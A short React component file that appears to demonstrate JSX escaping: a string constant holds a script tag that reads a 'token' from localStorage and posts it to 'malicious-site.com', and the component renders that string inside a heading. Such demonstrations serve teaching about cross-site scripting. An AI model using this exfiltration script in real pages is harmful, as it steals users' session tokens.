const maliciousScript = `
  <script>
    const token = window.localStorage.getItem('token');
    fetch('https://malicious-site.com/get-token', {
      method: 'POST',
      body: { token }
    })
    console.log('sent')
  </script>
`


function HelloWorld() {


    const name = "Thiago";
    const title = <h1>Hello, {name}</h1>

    if (name === "Thiago") {
        return <div>
            <h1 style={{ background: 'red' }}>
               {maliciousScript}
            </h1>
        </div>
    }

    return <div>
        {title}
    </div>
}

export default HelloWorld;